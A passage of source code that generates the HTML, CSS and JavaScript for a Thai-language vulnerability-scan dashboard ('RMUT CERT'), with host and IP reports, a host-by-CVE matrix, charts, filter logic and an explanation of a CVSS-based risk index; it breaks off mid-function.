        "<p class='sub' id='mx-cnt' style='margin:8px 2px 0'></p>"
        "<div style='margin-top:14px;background:#fbfcfe;border:1px solid var(--line);border-radius:8px;padding:12px'>"
        "  <div style='font-size:12px;font-weight:700;color:var(--ink);margin-bottom:8px'>📋 รหัสช่องโหว่ (CVE / Security Issue) ทั้งหมดในเมทริกซ์ (คลิกแถวเพื่อกรองเฉพาะ CVE นั้น):</div>"
        "  <div class='tbl-wrap' style='max-height:none'>"
        "    <table class='mxleg' id='mxleg-tbl'><thead id='mxleg-thd'><tr>"
        "      <th style='width:42px;text-align:center'>#</th>"
        "      <th>รหัส</th><th>CVE</th><th>หมวด</th><th>ความรุนแรง</th><th>ชื่อย่อ</th>"
        "      <th style='text-align:center'>โฮสต์ที่พบ</th>"
        "    </tr></thead><tbody id='mxleg-tb'></tbody></table>"
        "  </div>"
        "</div>"
    )

    vc = lvl_color[s["verdict"]["level"]]
    tmpl = r"""<!doctype html><html lang="th"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>RMUT CERT — แดชบอร์ดช่องโหว่</title>
<style>
:root{--ink:#1a237e;--ink2:#283593;--vuln:#c0392b;--warn:#d35400;--unk:#6b7280;--safe:#1e7e34;
  --line:#dde1ed;--bg:#f4f6fb;--card:#fff;--muted:#6b7280;--dr-w:620px}
*{box-sizing:border-box}
body{font-family:-apple-system,"Segoe UI","Sarabun","Loma",Tahoma,sans-serif;margin:0;background:var(--bg);color:#1a1c24}
.wrap{max-width:1160px;margin:0 auto;padding:22px 16px 60px}
h1{color:var(--ink);font-size:22px;margin:0 0 2px}
.sub{color:var(--muted);font-size:13px;margin:0 0 16px}
.band{border-radius:10px;padding:15px 20px;color:#fff;margin:12px 0 18px}
.band b{font-size:18px}.band p{margin:4px 0 0;opacity:.92;font-size:13px}
.cards{display:grid;grid-template-columns:repeat(5,1fr);gap:10px;margin-bottom:16px}
.card{background:var(--card);border:1px solid var(--line);border-radius:10px;padding:14px 10px;text-align:center;cursor:pointer;transition:transform .15s,box-shadow .15s,border-color .15s}.card:hover{transform:translateY(-2px);box-shadow:0 4px 14px rgba(26,35,126,.15);border-color:var(--ink)}
.card .n{font-size:26px;font-weight:800;color:var(--ink)}.card .l{font-size:11px;color:var(--muted);margin-top:3px}
.row2{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:16px}
.panel{background:var(--card);border:1px solid var(--line);border-radius:10px;padding:16px}
.panel h3{margin:0 0 10px;color:var(--ink);font-size:14px;font-weight:700}
.bar{display:flex;align-items:center;gap:8px;margin:6px 0;font-size:13px}
.bar .lab{width:90px;color:var(--muted);flex:none;font-size:12px}
.bar .track{flex:1;background:#eef0f5;border-radius:6px;height:14px;overflow:hidden}
.bar .fill{display:block;height:14px;border-radius:6px;min-width:3px}
.bar .v{width:36px;text-align:right;font-weight:700;font-size:13px;flex:none}
/* ── ตารางหลัก ── */
.tbl-wrap{overflow-x:auto;border:1px solid var(--line);border-radius:8px;max-height:none!important;overflow-y:visible!important}
.scroll{overflow-x:auto;border:1px solid var(--line);border-radius:8px;max-height:none!important;overflow-y:visible!important}
.chart-box{background:var(--bg);border:1px solid var(--line);border-radius:8px;padding:14px;transition:border-color .15s}
.chart-box:hover{border-color:var(--ink2)}
.charts-grid-3{display:grid;grid-template-columns:repeat(auto-fit,minmax(320px,1fr));gap:16px;margin-bottom:16px}
.charts-grid-2{display:grid;grid-template-columns:repeat(auto-fit,minmax(420px,1fr));gap:16px;margin-bottom:16px}
table{width:100%;border-collapse:collapse;font-size:13px}
thead th{background:var(--ink);color:#fff;padding:9px 10px;position:sticky;top:0;
  cursor:pointer;white-space:nowrap;text-align:left;user-select:none;border-right:1px solid rgba(255,255,255,.1)}
thead th:hover{background:var(--ink2)}
tbody tr{border-bottom:1px solid var(--line);transition:background .12s}
tbody tr:hover{background:#e8ecf8!important;cursor:pointer}
tbody td{padding:8px 10px;vertical-align:middle}
tr.critical-row{background:#fdf2f2}tr.warning-row{background:#fff8f0}
tr.unknown-row{background:#f9fafb}tr.safe-row{background:#f2fbf5}
.pill{display:inline-block;padding:2px 9px;border-radius:12px;color:#fff;font-size:11px;font-weight:600;white-space:nowrap}
.tag{display:inline-block;padding:1px 7px;border-radius:6px;font-size:11px;font-weight:600;white-space:nowrap}
.controls{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:10px;align-items:center}
.controls input,.controls select{padding:7px 11px;border:1px solid var(--line);border-radius:8px;font-size:13px;outline:none}
.controls input{flex:1;min-width:180px}.controls input:focus{border-color:var(--ink)}

/* ── Filter Chips ── */
.flt-chip{display:inline-flex;align-items:center;gap:6px;background:#fff;border:1.5px solid var(--ink);border-radius:6px;padding:3px 9px;font-size:12px;font-weight:700;color:var(--ink)}
.flt-chip .del{cursor:pointer;color:#c0392b;font-weight:900;font-size:13px;margin-left:3px;transition:transform .12s}
.flt-chip .del:hover{transform:scale(1.25)}

/* ── Drawer ── */
#overlay{position:fixed;inset:0;background:rgba(0,0,0,.35);z-index:100;opacity:0;pointer-events:none;transition:opacity .25s}
#overlay.open{opacity:1;pointer-events:all}
#drawer{position:fixed;top:0;right:0;width:var(--dr-w);max-width:98vw;height:100vh;background:#fff;
  z-index:101;transform:translateX(100%);transition:transform .28s cubic-bezier(.4,0,.2,1);
  display:flex;flex-direction:column;box-shadow:-4px 0 28px rgba(0,0,0,.18)}
#drawer.open{transform:translateX(0)}
#dr-head{background:var(--ink);color:#fff;padding:16px 18px 12px;flex:none}
#dr-head .dr-host{font-size:17px;font-weight:700;word-break:break-all;margin-bottom:6px}
#dr-head .dr-meta{font-size:12px;opacity:.85;display:flex;gap:12px;flex-wrap:wrap}
#dr-close{position:absolute;top:12px;right:14px;background:none;border:none;color:#fff;
  font-size:22px;cursor:pointer;line-height:1;padding:2px 6px;border-radius:4px}
#dr-close:hover{background:rgba(255,255,255,.2)}
#dr-body{flex:1;overflow-y:auto;padding:0 0 24px}
.dr-info{display:grid;grid-template-columns:repeat(4,1fr);gap:0;border-bottom:1px solid var(--line)}
.dr-info-cell{padding:10px 14px;border-right:1px solid var(--line)}
.dr-info-cell:last-child{border-right:none}
.dr-info-cell .lab{font-size:11px;color:var(--muted);margin-bottom:3px;text-transform:uppercase;letter-spacing:.4px}
.dr-info-cell .val{font-size:13px;font-weight:600;color:#1a1c24}
.dr-sec{padding:12px 16px 0}
.dr-sec h4{font-size:13px;font-weight:700;color:var(--ink);margin:0 0 8px;
  text-transform:uppercase;letter-spacing:.5px;border-bottom:2px solid var(--line);padding-bottom:6px}
/* ── Findings list ── */
.fitem{border:1px solid var(--line);border-radius:8px;margin-bottom:8px;overflow:hidden}
.fitem-head{display:flex;align-items:flex-start;gap:10px;padding:10px 12px;cursor:pointer;
  background:#fafbff;border-bottom:1px solid transparent;transition:background .12s}
.fitem-head:hover{background:#eef2fb}
.fitem-head.open{border-bottom-color:var(--line);background:#eef2fb}
.fitem-cve{font-size:13px;font-weight:700;color:var(--ink);white-space:nowrap;flex:none}
.fitem-name{font-size:13px;flex:1;min-width:0;color:#1a1c24}
.fitem-cvss{font-size:12px;font-weight:700;color:#fff;padding:2px 7px;border-radius:5px;white-space:nowrap;flex:none}
.fitem-detail{display:none;padding:10px 12px;background:#fff;font-size:12.5px;line-height:1.7}
.fitem-detail.open{display:block}
.fitem-detail table{font-size:12px}
.fitem-detail td:first-child{color:var(--muted);white-space:nowrap;padding-right:12px;vertical-align:top;width:130px}
.fitem-detail td{padding:3px 0}
.sev-sep{font-size:11px;font-weight:700;color:#fff;padding:4px 10px;border-radius:4px;margin:12px 0 6px}
.bk-vulnerable{border-left:4px solid var(--vuln)!important}
.bk-warning{border-left:4px solid var(--warn)!important}
.bk-unknown{border-left:4px solid var(--unk)!important}
.bk-safe{border-left:4px solid var(--safe)!important}
/* ── Matrix ── */
.mxtbl{font-size:11px}.mxtbl th{padding:5px 4px;text-align:center}
.mxtbl td.mxh{white-space:nowrap;font-size:11px;max-width:210px;overflow:hidden;text-overflow:ellipsis}
td.mxc{text-align:center;font-weight:800;color:#fff;padding:5px 4px;border:1px solid #e3e6ef;font-size:11px}
.mx-v{background:#c0392b}.mx-w{background:#d35400}.mx-u{background:#868e96}
.mx-s{background:#1e7e34}.mx-na{background:#f8f9fa;color:#adb5bd;font-weight:400}
.mxkey{display:inline-block;padding:1px 7px;border-radius:9px;color:#fff;font-size:11px;margin:0 2px}
.mxleg{font-size:11px}.mxleg td{white-space:nowrap}.mxleg td:last-child{white-space:normal}
.foot{color:var(--muted);font-size:11px;margin-top:20px;text-align:center}
/* ── IP Report ── */
.ip-type{font-size:11px;padding:2px 8px;border-radius:10px;font-weight:700;flex:none}
.ip-type.pub{background:#dbeafe;color:#1d4ed8}.ip-type.priv{background:#f3f4f6;color:#374151}
.ip-sum{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin-bottom:14px}
.ip-sum-card{background:var(--card);border:1px solid var(--line);border-radius:8px;padding:12px;text-align:center;transition:all .15s}
.ip-sum-card:hover{transform:translateY(-2px);box-shadow:0 3px 10px rgba(26,35,126,.12);border-color:var(--ink)}
.ip-sum-card .n{font-size:22px;font-weight:800;color:var(--ink)}
.ip-sum-card .l{font-size:11px;color:var(--muted);margin-top:2px}
@media(max-width:780px){.cards{grid-template-columns:repeat(2,1fr)}.row2{grid-template-columns:1fr}
  #drawer{width:100vw}.ip-sum{grid-template-columns:repeat(2,1fr)}}</style></head>
<body>
<div class="wrap">
<h1>RMUT CERT — แดชบอร์ดผลการตรวจช่องโหว่</h1>
<p class="sub" id="sub"></p>
<div class="band" style="background:__VC__"><b id="vh"></b><p id="vd"></p></div>

<!-- ── Global Sticky Filter Banner ── -->
<div id="filter-banner" style="display:none;position:sticky;top:8px;z-index:90;background:#eef2fb;border:2px solid var(--ink);border-radius:10px;padding:12px 18px;margin-bottom:18px;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:10px;box-shadow:0 4px 14px rgba(26,35,126,.15)">
  <div style="font-size:13.5px;font-weight:700;color:var(--ink);display:flex;align-items:center;gap:8px;flex-wrap:wrap">
    <span>🔍 กำลังแสดงผลทุกส่วนเฉพาะ:</span>
    <span id="filter-banner-text" style="display:inline-flex;gap:6px;flex-wrap:wrap;align-items:center"></span>
    <span id="filter-banner-stats" style="font-size:12px;color:var(--ink);font-weight:700;background:rgba(255,255,255,.85);padding:3px 8px;border-radius:4px;border:1px solid #c5d2f6"></span>
  </div>
  <div style="display:flex;gap:8px;align-items:center">
    <button onclick="clearGlobalFilter()" style="background:#c0392b;border:none;color:#fff;padding:6px 14px;border-radius:6px;font-size:12px;font-weight:700;cursor:pointer;transition:all .15s">
      ✕ ล้างตัวกรองทั้งหมด
    </button>
  </div>
</div>

<p style="margin:0 0 6px;font-size:12px;font-weight:700;color:var(--muted)">การ์ดสรุปด้านล่างนับ <b style="color:var(--ink)">รายหัวข้อการตรวจ CVE</b> (1 โฮสต์มีได้หลายรายการ)</p>
<div class="cards" id="cards"></div>

<div class="row2">
  <div class="panel"><h3>ภาพรวมโฮสต์ <span style="font-weight:400;color:var(--muted);font-size:12px">· นับรายเครื่อง</span></h3><div id="ovh"></div></div>
  <div class="panel"><h3>ภาพรวมรายการตรวจ CVE <span style="font-weight:400;color:var(--muted);font-size:12px">· นับรายหัวข้อ</span></h3><div id="ov"></div></div>
</div>
<div class="row2">
  <div class="panel"><h3>ความรุนแรง <span style="font-weight:400;color:var(--muted);font-size:12px">· นับรายหัวข้อ CVE</span></h3><div id="sev"></div></div>
  <div class="panel"><h3>คำอธิบายหน่วยนับ</h3><div style="font-size:12.5px;color:#444;line-height:1.8">
    <b style="color:var(--ink)">รายเครื่อง (โฮสต์)</b> — จัดระดับของแต่ละเครื่อง ผลรวม = จำนวนโฮสต์ทั้งหมด<br>
    <b style="color:var(--ink)">รายหัวข้อ CVE</b> — 1 เครื่องตรวจหลายหัวข้อ ตัวเลขจึงมากกว่าจำนวนเครื่อง<br>
    <span style="color:var(--muted)">ตัวเลขทั้งสองหน่วยตรงกับไฟล์ PDF / Excel / CSV</span>
  </div></div>
</div>

<!-- ── ความครอบคลุม 8 กลุ่มระบบ ThaiCERT ── -->
<div class="panel" style="margin-bottom:16px">
  <h3 style="margin:0 0 4px;color:var(--ink);font-size:14px;font-weight:700">🛡 ความครอบคลุมตามแนวทาง ThaiCERT · 8 กลุ่มระบบที่อาจใช้ PHP</h3>
  <p class="sub" id="tc8-cap" style="margin:0 0 10px"></p>
  <div class="tbl-wrap" style="max-height:none">
    <table id="tc8-tbl"><thead id="tc8-thd"></thead><tbody id="tc8-tb"></tbody></table>
  </div>
  <p class="sub" style="margin:8px 2px 0;color:var(--muted);font-size:11.5px">
    💡 <b>ความสามารถ (%)</b> = เพดานการมองเห็นจากภายนอกแบบไม่ล็อกอิน (remote unauthenticated) ของเครื่องมือโดยประมาณ —
    ไม่ใช่ความแม่นของผลลัพธ์รายกรณี หลายกลุ่มจะสูงขึ้นมากหากตรวจระดับโฮสต์ (nmap -O / agent / credential)
  </p>
</div>

<!-- ── รายงานโฮสต์ ── -->
<div class="panel" style="margin-bottom:16px">
  <h3 style="margin:0 0 10px;color:var(--ink);font-size:14px;font-weight:700">🖥 รายงานโฮสต์</h3>
  <div class="controls">
    <input id="q" placeholder="ค้นหา (โฮสต์ / IP / เซิร์ฟเวอร์ / PHP / CVE)..." oninput="applySearch(this.value)">
    <select id="flt" onchange="filterByLevel(this.value)">
      <option value="all">ทุกระดับความเสี่ยงโฮสต์</option>
      <option value="critical">เสี่ยงสูง (Critical)</option>
      <option value="warning">อาจเสี่ยง (Warning)</option>
      <option value="unknown">ยังไม่ทราบ (Unknown)</option>
      <option value="safe">ปลอดภัย (Safe)</option>
    </select>
  </div>
  <div class="tbl-wrap" style="max-height:none">
    <table id="tbl"><thead id="thd"></thead><tbody id="tb"></tbody></table>
  </div>
  <p class="sub" id="cnt" style="margin:8px 2px 0">
    <span style="color:var(--muted);font-size:12px">💡 คลิกชื่อโฮสต์เพื่อดูรายละเอียดช่องโหว่</span>
  </p>
</div>

<!-- ── รายงาน IP ── -->
<div class="panel" style="margin-bottom:16px">
  <h3 style="margin:0 0 10px;color:var(--ink);font-size:14px;font-weight:700">🌐 รายงาน IP Address</h3>
  <div class="ip-sum" id="ip-sum"></div>
  <div class="controls">
    <input id="ipq" placeholder="ค้นหา IP หรือโฮสต์..." oninput="applySearch(this.value)">
    <select id="ipflt" onchange="filterIPType(this.value)">
      <option value="all">IP ทั้งหมด</option>
      <option value="public">IP สาธารณะ</option>
      <option value="private">IP ภายใน</option>
    </select>
    <select id="iplvl" onchange="filterByLevel(this.value)">
      <option value="all">ทุกระดับ</option>
      <option value="critical">เสี่ยงสูง</option>
      <option value="warning">อาจเสี่ยง</option>
      <option value="unknown">ยังไม่ทราบ</option>
      <option value="safe">ปลอดภัย</option>
    </select>
  </div>
  <div class="tbl-wrap" style="max-height:none">
    <table id="iptbl"><thead id="ipthd"></thead><tbody id="iptb"></tbody></table>
  </div>
  <p id="ipcnt" style="font-size:13px;color:var(--muted);margin:8px 2px 0"></p>
</div>

<!-- ── เมทริกซ์ โฮสต์ × CVE ── -->
<div class="panel" style="margin-bottom:16px"><h3>เมทริกซ์ โฮสต์ × CVE</h3>__MATRIX__</div>

<!-- ── กราฟสถิติ Interactive (Chart.js) ── -->
<div class="panel" style="margin-bottom:16px">
  <div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px;margin-bottom:14px">
    <h3 style="margin:0">📊 กราฟสถิติ Interactive</h3>
    <span style="font-size:12px;color:var(--muted);background:#eef2fb;padding:4px 10px;border-radius:20px">
      💡 คลิกที่ส่วนต่างๆ ของกราฟ เพื่อเชื่อมโยงและกรองข้อมูลทุกส่วนบนหน้าทันที
    </span>
  </div>

  <!-- แถวที่ 1: ความเสี่ยงโฮสต์, Top IP เสี่ยง, ความรุนแรงช่องโหว่ -->
  <div class="charts-grid-3">
    <div class="chart-box">
      <h4 style="color:var(--ink);font-size:12px;font-weight:700;margin:0 0 8px;text-transform:uppercase;letter-spacing:.5px">
        ระดับความเสี่ยง (โฮสต์) <span style="font-weight:400;color:var(--muted);font-size:11px">🔍 คลิกเพื่อกรอง</span>
      </h4>
      <div style="position:relative;height:230px"><canvas id="ch-donut-risk"></canvas></div>
    </div>
    <div class="chart-box">
      <h4 style="color:var(--ink);font-size:12px;font-weight:700;margin:0 0 8px;text-transform:uppercase;letter-spacing:.5px">
        🌐 Top IP ที่มีความเสี่ยงมากที่สุด <span style="font-weight:400;color:var(--muted);font-size:11px">🔍 คลิกดูโฮสต์ใน IP</span>
      </h4>
      <div style="position:relative;height:230px"><canvas id="ch-donut-ip"></canvas></div>
    </div>
    <div class="chart-box">
      <h4 style="color:var(--ink);font-size:12px;font-weight:700;margin:0 0 8px;text-transform:uppercase;letter-spacing:.5px">
        ระดับความรุนแรงช่องโหว่ <span style="font-weight:400;color:var(--muted);font-size:11px">🔍 คลิกเพื่อกรอง</span>
      </h4>
      <div style="position:relative;height:230px"><canvas id="ch-donut-sev"></canvas></div>
    </div>
  </div>

  <!-- แถวที่ 2: ประเภทช่องโหว่, เทคโนโลยีเซิร์ฟเวอร์, สถานะการตรวจพบ -->
  <div class="charts-grid-3">
    <div class="chart-box">
      <h4 style="color:var(--ink);font-size:12px;font-weight:700;margin:0 0 8px;text-transform:uppercase;letter-spacing:.5px">
        ประเภทช่องโหว่ (Category) <span style="font-weight:400;color:var(--muted);font-size:11px">🔍 คลิกเพื่อค้นหา</span>
      </h4>
      <div style="position:relative;height:230px"><canvas id="ch-bar-cat"></canvas></div>
    </div>
    <div class="chart-box">
      <h4 style="color:var(--ink);font-size:12px;font-weight:700;margin:0 0 8px;text-transform:uppercase;letter-spacing:.5px">
        🖥 สัดส่วนเทคโนโลยีเว็บเซิร์ฟเวอร์ <span style="font-weight:400;color:var(--muted);font-size:11px">🔍 คลิกเพื่อกรอง</span>
      </h4>
      <div style="position:relative;height:230px"><canvas id="ch-donut-tech"></canvas></div>
    </div>
    <div class="chart-box">
      <h4 style="color:var(--ink);font-size:12px;font-weight:700;margin:0 0 8px;text-transform:uppercase;letter-spacing:.5px">
        สถานะการตรวจพบ <span style="font-weight:400;color:var(--muted);font-size:11px">🔍 คลิกเพื่อกรอง</span>
      </h4>
      <div style="position:relative;height:230px"><canvas id="ch-bar-status"></canvas></div>
    </div>
  </div>

  <!-- แถวที่ 3: Top 15 โฮสต์เสี่ยงสูง -->
  <div class="chart-box" style="margin-bottom:16px">
    <h4 style="color:var(--ink);font-size:12px;font-weight:700;margin:0 0 8px;text-transform:uppercase;letter-spacing:.5px">
      Top 15 โฮสต์เสี่ยงสูง (ดัชนีเสี่ยง) <span style="font-weight:400;color:var(--muted);font-size:11px">🔍 คลิกที่แท่งกราฟเพื่อเปิดรายละเอียดโฮสต์ทันที</span>
    </h4>
    <div style="position:relative;height:340px"><canvas id="ch-bar-hosts"></canvas></div>
  </div>

  <!-- แถวที่ 4: การกระจาย CVSS Score, โฮสต์: ยืนยัน vs พบสัญญาณ -->
  <div class="charts-grid-2">
    <div class="chart-box">
      <h4 style="color:var(--ink);font-size:12px;font-weight:700;margin:0 0 8px;text-transform:uppercase;letter-spacing:.5px">
        การกระจาย CVSS Score <span style="font-weight:400;color:var(--muted);font-size:11px">🔍 คลิกแท่งเพื่อกรองช่วงคะแนน</span>
      </h4>
      <div style="position:relative;height:230px"><canvas id="ch-hist-cvss"></canvas></div>
    </div>
    <div class="chart-box">
      <h4 style="color:var(--ink);font-size:12px;font-weight:700;margin:0 0 8px;text-transform:uppercase;letter-spacing:.5px">
        โฮสต์: ยืนยัน vs พบสัญญาณ <span style="font-weight:400;color:var(--muted);font-size:11px">🔍 คลิกที่แท่งเพื่อดูโฮสต์</span>
      </h4>
      <div style="position:relative;height:230px"><canvas id="ch-stacked"></canvas></div>
    </div>
  </div>

  <!-- แถวที่ 5: ตรวจพบตาม 8 กลุ่มระบบ ThaiCERT -->
  <div class="chart-box" style="margin-bottom:4px">
    <h4 style="color:var(--ink);font-size:12px;font-weight:700;margin:0 0 8px;text-transform:uppercase;letter-spacing:.5px">
      🛡 ตรวจพบตาม 8 กลุ่มระบบ ThaiCERT <span style="font-weight:400;color:var(--muted);font-size:11px">· จำนวนโฮสต์ต่อกลุ่ม (สีแท่ง = เพดานความสามารถตรวจ) · 🔍 คลิกแท่งเพื่อดูรายละเอียดกลุ่ม</span>
    </h4>
    <div style="position:relative;height:300px"><canvas id="ch-bar-tc8"></canvas></div>
  </div>
</div>

<!-- ── วิธีคำนวณดัชนีเสี่ยง ── -->
<div class="panel" style="margin-bottom:16px">
  <h3 id="meth-toggle" style="cursor:pointer;user-select:none">
    📐 วิธีคำนวณดัชนีความเสี่ยง (มาตรฐานสากล CVSS v3.1) <span id="meth-arr" style="font-size:18px;color:var(--muted)">›</span>
  </h3>
  <div id="meth-body" style="display:none">
    <p style="font-size:13px;line-height:1.7;color:var(--ink);margin:0 0 12px">
      ดัชนีความเสี่ยงรายโฮสต์ (0–100) อ้างอิงตามมาตรฐานสากล <b>CVSS v3.1 (Common Vulnerability Scoring System)</b> ซึ่งมีเพดานสูงสุด <b>10.0</b>
      โดยคำนวณจากเฉพาะ<b>รายการช่องโหว่ที่ตรวจพบจริง</b> นำค่า <b>CVSS (0.0–10.0)</b> คูณกับ <b>ตัวคูณสถานะ</b> (ยืนยันเสี่ยง=1.0, พบสัญญาณเสี่ยง=0.6, ยังไม่ทราบ/ปลอดภัย/N/A=0.0)
      แล้วหารด้วยเพดานมาตรฐาน CVSS (<b>10</b>) คูณ 100 โดยไม่นำรายการที่ไม่เกี่ยวข้อง (N/A) มาหารเฉลี่ย
      (เกณฑ์ระดับตามมาตรฐาน CVSS v3.1: <b>0</b>=ปลอดภัย · <b>1–39</b>=ต่ำ · <b>40–69</b>=ปานกลาง/ต้องตรวจสอบ · <b>70–89</b>=เสี่ยงสูง · <b>90–100</b>=วิกฤต)
    </p>
    <div style="background:var(--bg);border:1.5px solid var(--ink);border-radius:8px;
                padding:12px 16px;text-align:center;font-size:14px;font-weight:700;
                color:var(--ink);margin-bottom:16px">
      ดัชนีเสี่ยงรายโฮสต์ = min(100, Σ(คะแนน CVSS × ตัวคูณสถานะ) ÷ 10 × 100)
    </div>
  </div>
</div>

<p class="foot">RMUT CERT Vulnerability Scanner · Confidential · เปิดในเบราว์เซอร์เพื่อค้นหา/กรอง/คลิกดูรายละเอียด</p>
</div>

<!-- Drawer overlay + panel -->
<div id="overlay" onclick="closeDr()"></div>
<div id="drawer">
  <div id="dr-head">
    <button id="dr-close" onclick="closeDr()" title="ปิด">✕</button>
    <div class="dr-host" id="dr-host"></div>
    <div class="dr-meta" id="dr-meta"></div>
  </div>
  <div id="dr-body"></div>
</div>

<script>__CHARTJS__</script>
<script>
const D=__PAYLOAD__;
const LC={critical:'#c0392b',warning:'#d35400',unknown:'#6b7280',safe:'#1e7e34','n/a':'#9aa0ab'};
const LT={critical:'เสี่ยงสูง',warning:'อาจเสี่ยง',unknown:'ยังไม่ทราบ',safe:'ปลอดภัย','n/a':'เข้าไม่ถึง'};
const SC={Critical:'#c0392b',High:'#d35400',Medium:'#e67e22',Low:'#2980b9',Info:'#6b7280'};
const BKTORD={vulnerable:0,warning:1,unknown:2,safe:3};
const SEV_ORDER={Critical:0,High:1,Medium:2,Low:3,Info:4};

function esc(s){return(s==null?'':''+s).replace(/[&<>"]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]))}
function cvssColor(v){if(v==null||v===''||isNaN(v))return'#6b7280';v=parseFloat(v);if(v>=9)return'#c0392b';if(v>=7)return'#d35400';if(v>=4)return'#e67e22';if(v>0)return'#2980b9';return'#1e7e34'}
function fmtHostCvss(h){
  if(!h||!h.reachable)return'—';
  if(h.maxcvss!=null&&h.maxcvss>0)return h.maxcvss.toFixed(1);
  if(h.level==='safe'||F.cvssBin===0||F.bucket==='safe')return'0.0';
  return'—';
}
function hostCvssColor(h){
  const s=fmtHostCvss(h);
  return s==='—'?'#6b7280':cvssColor(parseFloat(s));
}

// Global Filter State
const F = {
  bucket: 'all',    // 'vulnerable', 'warning', 'unknown', 'safe' (สถานะการตรวจพบ)
  level: 'all',     // 'critical', 'warning', 'unknown', 'safe', 'n/a' (ระดับโฮสต์)
  sev: 'all',       // 'Critical', 'High', 'Medium', 'Low', 'Info'
  cat: 'all',       // Category เช่น 'Node.js', 'PHP', 'NGINX'
  server: 'all',    // Server เช่น 'nginx', 'Apache'
  ip: '',           // IP เจาะจง
  ipType: 'all',    // 'all', 'public', 'private', 'none'
  cve: 'all',       // CVE ID เช่น 'CVE-2024-4577'
  cvssBin: -1,      // 0..9
  q: ''             // ข้อความค้นหา
};

let sortKey='score', sortDir=-1;
let sortKeyIP='worst', sortDirIP=-1;
let cachedFilteredData = null;

function scrollToTable(id){
  const el = document.getElementById(id || 'tbl');
  if(el){ el.scrollIntoView({ behavior: 'smooth', block: 'start' }); }
}

function clearGlobalFilter(){
  F.bucket='all'; F.level='all'; F.sev='all'; F.cat='all';
  F.server='all'; F.ip=''; F.ipType='all'; F.cve='all'; F.cvssBin=-1; F.q='';
  syncControls();
  updateAll();
}

function filterByBucket(bkt){
  F.bucket = (F.bucket === bkt ? 'all' : bkt);
  if(F.bucket !== 'all'){ F.level = 'all'; }
  syncControls();
  updateAll('tbl');
}

function filterByLevel(lvl){
  lvl = (lvl || 'all').toLowerCase();
  F.level = (F.level === lvl ? 'all' : lvl);
  if(F.level !== 'all'){ F.bucket = 'all'; }
  syncControls();
  updateAll('tbl');
}

function filterByUnreachable(){
  F.level = (F.level === 'n/a' ? 'all' : 'n/a');
  if(F.level !== 'all'){ F.bucket = 'all'; }
  syncControls();
  updateAll('tbl');
}

function filterBySeverity(sev){
  F.sev = (F.sev === sev ? 'all' : sev);
  syncControls();
  updateAll('tbl');
}

function filterByCategory(cat){
  F.cat = (F.cat === cat ? 'all' : cat);
  syncControls();
  updateAll('tbl');
}

function filterByServer(srv){
  F.server = (F.server === srv ? 'all' : srv);
  syncControls();
  updateAll('tbl');
}

function filterByIP(ip){
  F.ip = (F.ip === ip ? '' : ip);
  syncControls();
  updateAll('iptbl');
  if(F.ip){
    const uid = 'ip_' + F.ip.replace(/\./g, '_');
    const sub = document.getElementById('ipsub_' + uid);
    const arr = document.getElementById('iarr_' + uid);
    if(sub) sub.style.display = '';
    if(arr) arr.textContent = ' ▾';
  }
}

function filterIPType(type){
  F.ipType = (F.ipType === type ? 'all' : type);
  syncControls();
  updateAll('iptbl');
}

function filterByCVE(cve){
  F.cve = (F.cve === cve ? 'all' : cve);
  syncControls();
  updateAll('mxtbl-wrap');
}

function filterByCvssBin(bin){
  bin = parseInt(bin, 10);
  F.cvssBin = (F.cvssBin === bin ? -1 : bin);
  syncControls();
  updateAll('tbl');
}

function applySearch(q){
  F.q = q || '';
  syncControls();
  updateAll();
}

function syncControls(){
  const q = document.getElementById('q'); if(q && q.value !== F.q) q.value = F.q;
  const ipq = document.getElementById('ipq'); if(ipq && ipq.value !== F.q) ipq.value = F.q;
  const flt = document.getElementById('flt'); if(flt) flt.value = (F.level === 'n/a' ? 'all' : F.level);
  const iplvl = document.getElementById('iplvl'); if(iplvl) iplvl.value = (F.level === 'n/a' ? 'all' : F.level);
  const ipflt = document.getElementById('ipflt'); if(ipflt) ipflt.value = F.ipType;
}

function isPublicIP(ip){
  if(!ip)return null;
  const p=ip.split('.').map(Number);
  if(p[0]===10)return false;
  if(p[0]===172&&p[1]>=16&&p[1]<=31)return false;
  if(p[0]===192&&p[1]===168)return false;
  if(p[0]===127)return false;
  return true;
}

// Master Filter Function: evaluates hosts and findings strictly according to F
function getFilteredData(){
  const isFindingFilter = (F.bucket !== 'all' || F.sev !== 'all' || F.cat !== 'all' || F.cve !== 'all' || F.cvssBin >= 0);
  const qLow = (F.q || '').toLowerCase().trim();
  const srvLow = (F.server !== 'all' ? F.server.toLowerCase().trim() : '');

  const filteredHosts = [];
  const filteredFindings = [];

  D.hosts.forEach(h => {
    // 1. Host level / Unreachable
    if(F.level !== 'all'){
      if(F.level === 'n/a'){
        if(h.reachable) return;
      } else {
        const hl = (h.reachable ? h.level : 'n/a').toLowerCase();
        if(hl !== F.level.toLowerCase()) return;
      }
    }

    // 2. IP check
    if(F.ip && h.ip !== F.ip) return;
    if(F.ipType !== 'all'){
      const pub = isPublicIP(h.ip);
      if(F.ipType === 'public' && pub !== true) return;
      if(F.ipType === 'private' && pub !== false) return;
      if(F.ipType === 'none' && h.ip) return;
    }

    // 3. Web server check
    if(srvLow){
      const hs = (h.server || 'Unknown').toLowerCase();
      if(!hs.includes(srvLow)) return;
    }

    // 4. Filter findings for this host
    const allFinds = h.findings || [];
    const matchedFinds = allFinds.filter(f => {
      if(F.bucket !== 'all'){
        if(f.bucket !== F.bucket) return false;
      } else if(F.cvssBin === 0){
        // ตามมาตรฐาน CVSS v3.1: คะแนน 0.0 (None) คือรายการที่ตรวจสอบแล้วว่าปลอดภัย (safe)
        if(f.bucket !== 'safe') return false;
      } else if(F.cat !== 'all' || F.sev !== 'all' || F.cve !== 'all' || F.cvssBin > 0){
        // Default finding-specific filters to impact findings (vulnerable / warning)
        if(f.bucket !== 'vulnerable' && f.bucket !== 'warning') return false;
      }
      if(F.sev !== 'all' && (f.sev || 'Info').toLowerCase() !== F.sev.toLowerCase()) return false;
      if(F.cat !== 'all' && (f.cat || '').toLowerCase() !== F.cat.toLowerCase()) return false;
      if(F.cve !== 'all' && (f.cve || '').toUpperCase() !== F.cve.toUpperCase()) return false;
      if(F.cvssBin >= 0){
        if(F.cvssBin === 0){
